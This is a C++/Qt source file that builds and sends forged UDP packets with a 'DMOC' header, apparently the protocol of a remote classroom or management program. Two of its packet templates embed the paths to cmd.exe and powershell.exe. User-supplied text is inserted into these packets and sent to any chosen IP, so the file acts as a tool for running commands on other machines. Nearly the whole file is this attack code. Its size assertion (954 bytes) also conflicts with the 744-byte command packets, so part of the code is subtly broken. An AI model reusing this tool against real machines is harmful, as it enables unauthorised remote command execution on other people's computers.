// SendingManager.cpp
#include "SendingManager.h"
#include <array>
#include <random>
#include <QDebug>

#include "SettingManager.h"

QByteArray createBase0Packet() {
    QByteArray header = QByteArray::fromHex(
        "444d4f43000001009e0300001041afbfa0e7524091dc27a3b6f9292e204e0000c0a850819103000091030000000800000000000005000000"
    );
    QByteArray padding(898, '\x00');
    return header + padding;
}

SendingManager* SendingManager::m_instance = nullptr;

const std::array<QByteArray, 3> SendingManager::m_base = {
    createBase0Packet(),

    QByteArrayLiteral(
        "\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x5b\x68\x2b\x25"
        "\x6f\x61\x64\x4d\xa7\x92\xf0\x47\x00\xc5\xa4\x0e\x20\x4e\x00\x00"
        "\xc0\xa8\x64\x86\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00"
        "\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x43\x00\x3a\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x5c\x00\x73\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00"
        "\x32\x00\x5c\x00\x63\x00\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00"
        "\x65\x00\x00\x00"
    ) + QByteArray(744 - 120, '\x00'),

    QByteArrayLiteral(
        "\x44\x4d\x4f\x43\x00\x00\x01\x00\x6e\x03\x00\x00\x5b\x68\x2b\x25"
        "\x6f\x61\x64\x4d\xa7\x92\xf0\x47\x00\xc5\xa4\x0e\x20\x4e\x00\x00"
        "\xc0\xa8\x64\x86\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00"
        "\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00\x43\x00\x3a\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x5c\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00"
        "\x50\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x53\x00\x68\x00\x65\x00"
        "\x6c\x00\x6c\x00\x5c\x00\x76\x00\x31\x00\x2e\x00\x30\x00\x5c\x00"
        "\x70\x00\x6f\x00\x77\x00\x65\x00\x72\x00\x73\x00\x68\x00\x65\x00"
        "\x6c\x00\x6c\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00"
    ) + QByteArray(744 - 180, '\x00')
};

SendingManager* SendingManager::instance()
{
    if (!m_instance)
        m_instance = new SendingManager();
    return m_instance;
}

SendingManager::SendingManager(QObject* parent)
    : QObject(parent)
{
}

QByteArray SendingManager::formatToBytes(const QString& text) const
{
    QByteArray out;
    for (QChar ch : text) {
        uint code = ch.unicode();
        out.append(static_cast<char>(code & 0xFF));
        out.append(static_cast<char>((code >> 8) & 0xFF));
    }
    return out;
}

// 构建消息包
QByteArray SendingManager::packMessage(const QString& type, const QString& content) const
{
    QByteArray result;
    int index = 0;

    if (type == QLatin1String("msg")) {
        result = m_base[0];
        index = 56;
    } else if (type == QLatin1String("cmd")) {
        result = m_base[1];
        index = 578;
    } else if (type == QLatin1String("powershell")) {
        result = m_base[2];
        index = 578;
    } else {
        return {};
    }

    if (index >= result.size()) {
        qWarning() << "Index out of bounds for type:" << type;
        return {};
    }

    QByteArray payload = formatToBytes(content);

    int len = qMin(payload.size(), result.size() - index);
    memcpy(result.data() + index, payload.constData(), len);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, 255);
    for (int i = 15; i < 20; ++i) {
        result[i] = static_cast<char>(dis(gen));
    }

    Q_ASSERT(result.size() == 954); // 对于 "msg" 类型

    return result;
}

void SendingManager::send(const QString& type, const QString& content, const QString& ip)
{
    QByteArray datagram = packMessage(type, content);
    if (datagram.isEmpty()) {
        qWarning() << "Failed to create datagram for type:" << type;
        return;
    }

    QUdpSocket socket;
    socket.writeDatagram(datagram, QHostAddress(ip), SettingsManager::instance()->getValue("port").toUInt());
}